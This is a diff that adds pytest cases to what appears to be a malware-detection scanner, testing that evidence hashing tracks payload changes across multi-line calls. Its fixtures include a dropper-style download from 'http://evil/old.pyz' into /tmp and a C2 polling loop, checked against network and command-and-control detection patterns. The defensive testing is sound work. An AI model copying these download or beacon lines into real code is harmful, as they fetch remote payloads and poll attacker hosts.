@@ -461,6 +461,48 @@ def test_logical_line_end_follows_backslash_continuation():
     assert sp._evidence_hash(eo) != sp._evidence_hash(en)
 
 
+def test_logical_line_end_blanks_multiline_triple_string():
+    # A ) inside a triple-quoted string argument must not close the call early; the
+    # data= after the closing triple-quote must still bind so a changed payload
+    # reopens (a per-line string blanker cannot mask a multi-line string).
+    old = 'requests.post("""http://h\n/path)""", data={"x": "old"})\n'
+    new = 'requests.post("""http://h\n/path)""", data={"x": "evil"})\n'
+    eo = sp._extract_evidence(old, sp.RE_NETWORK)
+    en = sp._extract_evidence(new, sp.RE_NETWORK)
+    assert sp._evidence_hash(eo) != sp._evidence_hash(en)
+
+
+def test_extract_evidence_binds_call_embedded_in_string():
+    # A call whose text lives INSIDE a triple-quoted string (a dropper embedding a
+    # setup.py payload) must still bind its argument lines. Blanking the multi-line
+    # string must not shrink the span below the legacy single-line view: the union
+    # of both views keeps the URL argument bound so a changed payload reopens.
+    src = (
+        'PAYLOAD = """\n'
+        "urllib.request.urlretrieve(\n"
+        '    "http://evil/old.pyz",\n'
+        '    "/tmp/x.pyz",\n'
+        ")\n"
+        '"""\n'
+    )
+    eo = sp._extract_evidence(src, sp.RE_NETWORK)
+    en = sp._extract_evidence(src.replace("old.pyz", "evil2.pyz"), sp.RE_NETWORK)
+    assert "L3" in eo  # the URL argument line is bound, not just the API line
+    assert sp._evidence_hash(eo) != sp._evidence_hash(en)
+
+
+def test_extract_evidence_fallback_line_numbers_are_correct():
+    # The DOTALL fallback maps match offsets to line numbers via precomputed
+    # newline offsets (bisect, not a quadratic content.count per match); guard that
+    # the mapping is exact so a cross-line match is recorded at its true line and a
+    # changed continuation reopens.
+    content = "x = 1\ny = 2\nwhile True:\n    time.sleep(60)\n    requests.get('http://a/old')\n"
+    e1 = sp._extract_evidence(content, sp.RE_C2_POLLING)
+    e2 = sp._extract_evidence(content.replace("/old", "/evil"), sp.RE_C2_POLLING)
+    assert "L3" in e1  # the while-True loop starts on line 3, not line 1
+    assert sp._evidence_hash(e1) != sp._evidence_hash(e2)
+
+
 def test_large_js_bundle_pins_whole_content_when_other_finding_fires():
     # A >100 KB JS bundle that also trips the hex-var obfuscation signature binds
     # the whole bundle, so changing payload code elsewhere (obfuscation line
